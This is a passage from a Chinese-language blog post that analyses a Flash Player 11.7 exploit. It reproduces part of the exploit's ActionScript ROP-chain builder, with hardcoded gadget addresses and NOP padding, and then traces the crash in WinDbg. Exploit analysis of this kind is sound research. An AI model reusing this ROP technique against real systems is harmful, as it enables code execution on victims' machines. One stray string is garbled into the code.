
| 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 |
| --- |
| ```actionscript
public function gen_rop4():ByteArray {
    var baseaddr:int = 0;
    var i:* = undefined;
    if (sys == 1) {
        baseaddr = 2008940544;
        // 77be0000
        简体中文版
    } else if (sys == 2) {
        baseaddr = 2009137152;
        // 77c10000
    } else if (sys == 3) {
        baseaddr = 2008940544;
        // 77be0000
    }
    var rop:ByteArray = new ByteArray();
    rop.endian = "littleEndian";
    rop.writeMultiByte("FILL", "iso-8859-1");
    rop.writeUnsignedInt(171922 + baseaddr);
    // 77C09F92
    rop.writeUnsignedInt(71891 + baseaddr);
    // 77BF18D3
    rop.writeUnsignedInt(156885 + baseaddr);
    // 77C064D5
    rop.writeUnsignedInt(156885 + baseaddr);
    // 77C064D5
    rop.writeUnsignedInt(0xe0913 + baseaddr);
    // 77CC0913
    rop.writeUnsignedInt(513);
    // 201
    rop.writeUnsignedInt(248825 + baseaddr);
    // 77C1CBF9
    rop.writeUnsignedInt(64);
    ...
    rop.writeUnsignedInt(2425411327);
    for (i = rop.length; i < 204;) {
        rop.writeByte(0x90);
        i++;
    }
    return rop;
}
``` |

中断的地址`77bf200d`距离`77BF18D3`蛮近的，但是也不确定是不是就是这里出现的问题。

看一下函数调用流程：

|  |  |
| --- | --- |
| 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 |
| ```text
0:019> kb
ChildEBP RetAddr  Args to Child
0394fa44 10101815 00000000 00000000 00000000 MSACM32_77be0000!_pRawDllMain <PERF> (MSACM32_77be0000+0x1200d)
WARNING: Stack unwind information not available. Following frames may be wrong.
0394fa70 10103075 00000000 02a563b0 02aa41c0 Flash32_11_7_700_261+0x101815
0394faf8 102dff93 02aa41c0 102e0063 02aa41c0 Flash32_11_7_700_261+0x103075
0394fb00 102e0063 02aa41c0 100fe0fd 00000000 Flash32_11_7_700_261!DllUnregisterServer+0xed29a
0394fb08 100fe0fd 00000000 031b2000 00000000 Flash32_11_7_700_261!DllUnregisterServer+0xed36a
0394fb1c 1015e803 7c809832 031b2000 031b2000 Flash32_11_7_700_261+0xfe0fd
0394fb6c 10210898 00000001 7c809832 031b2000 Flash32_11_7_700_261+0x15e803
0394fb80 10210e84 02c2d000 10210ebc 0394ff18 Flash32_11_7_700_261!DllUnregisterServer+0x1db9f
0394fb88 10210ebc 0394ff18 1003c391 00000001 Flash32_11_7_700_261!DllUnregisterServer+0x1e18b
0394fb90 1003c391 00000001 031b2000 032f2020 Flash32_11_7_700_261!DllUnregisterServer+0x1e1c3
0394ff90 10629336 02a783e0 10ba9cb4 02a7d338 Flash32_11_7_700_261+0x3c391
00000000 00000000 00000000 00000000 00000000 Flash32_11_7_700_261!IAEModule_IAEKernel_UnloadModule+0xe7ac6
``` |

很好，看来至少前面的函数帧都是Flash中的代码，看一下第一个函数处的代码：

|  |  |
| --- | --- |
| 1 2 3 4 5 6 7 8 9 10 |
| ```asm
0:019> ub Flash32_11_7_700_261+0x101815
Flash32_11_7_700_261+0x101804:
10101804 10d9            adc     cl,bl
10101806 ee              out     dx,al
10101807 53              push    ebx
10101808 51              push    ecx
10101809 51              push    ecx
1010180a dd1c24          fstp    qword ptr [esp]
1010180d ff7508          push    dword ptr [ebp+8]
10101810 e821f9ffff      call    Flash32_11_7_700_261+0x101136 (10101136)
``` |

有了这个位置之后，我们可以重新调试，在`10101810`的位置下断（重命名此处调用的函数为`rop_func`），然后跟进看看函数是怎么到达`77bf200d`这个中断位置的。

程序中断在`10101810`之后，可以建立一个快照，然后按`F5`，发现程序在这里一共中断了4次。因此回到一开始的快照，然后中断四次后就停下来步入。

### 3.1.2 解决遇到的问题

但是接下来我遇到了一个问题，步入之后，程序在这个函数正常的执行，然后跳出来了Σ(っ °Д °;)っ

*其实出现这个问题的原因特别特别简单，但是当时我就没想到……*

为了找出问题的原因，我在 IDA 中打开`Flash32_11_7_700_261.ocx`文件，然后定位到`Flash32_11_7_700_261+0x101136`这个函数，在多个跳转位置（就是 IDA 中标记了`loc_xxxx`的位置）下了断点：

|  |  |
| --- | --- |
| 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 |
| ```text
0:020> bl
0 e 76b5d038     0001 (0001) 0:**** WINMM!midiOutPlayNextPolyEvent
// 这个是之前调试其他问题留下的，忽略它
1 e 10101810     0001 (0001) 0:**** Flash32_11_7_700_261+0x101810
2 e 10101136     0001 (0001) 0:**** Flash32_11_7_700_261+0x101136
// 函数在这里开始
3 e 10101153     0001 (0001) 0:**** Flash32_11_7_700_261+0x101153
4 e 10101173     0001 (0001) 0:**** Flash32_11_7_700_261+0x101173
5 e 10101199     0001 (0001) 0:**** Flash32_11_7_700_261+0x101199
6 e 101011b3     0001 (0001) 0:**** Flash32_11_7_700_261+0x1011b3
7 e 101011f2     0001 (0001) 0:**** Flash32_11_7_700_261+0x1011f2
8 e 1010122e     0001 (0001) 0:**** Flash32_11_7_700_261+0x10122e
9 e 10101261     0001 (0001) 0:**** Flash32_11_7_700_261+0x101261
10 e 10101265     0001 (0001) 0:**** Flash32_11_7_700_261+0x101265
11 e 1010126b     0001 (0001) 0:**** Flash32_11_7_700_261+0x10126b
12 e 101012a8     0001 (0001) 0:**** Flash32_11_7_700_261+0x1012a8
13 e 101012da     0001 (0001) 0:**** Flash32_11_7_700_261+0x1012da
14 e 101012f3     0001 (0001) 0:**** Flash32_11_7_700_261+0x1012f3
15 e 1010116e     0001 (0001) 0:**** Flash32_11_7_700_261+0x10116e
16 e 10101299     0001 (0001) 0:**** Flash32_11_7_700_261+0x101299
17 e 1010114c     0001 (0001) 0:**** Flash32_11_7_700_261+0x10114c
// 函数在这里退出
``` |

然后不断按`F5`，记录下中断的位置（以下不是直接输出内容，做了整理）：

|  |  |
| --- | --- |
| 1 2 3 4 5 6 7 8 9 10 11 12 13 14 |
| ```text
Breakpoint 2 hit
Breakpoint 3 hit
Breakpoint 4 hit
Breakpoint 5 hit
Breakpoint 6 hit
Breakpoint 7 hit
Breakpoint 8 hit
Breakpoint 10 hit
Breakpoint 11 hit
Breakpoint 16 hit
Breakpoint 17 hit
Breakpoint 5 hit
Breakpoint 6 hit
// 然后就中断在异常位置了
``` |

注意到在程序中断在第17个断点之后，就会从该函数返回，但是之后程序又到达了函数代码处，却没有在第2个断点，即函数开始位置中断，而是直接中断在了第5个断点处。

为啥会直接执行到第5个断点这里呢？之后我又多设置了几个断点，这里不再贴出过程，总之我真的是突然灵光一闪，意识到这个函数它嵌套了！！！

当程序第一次中断在第5个断点时，看一下函数调用流程：

|  |  |
| --- | --- |
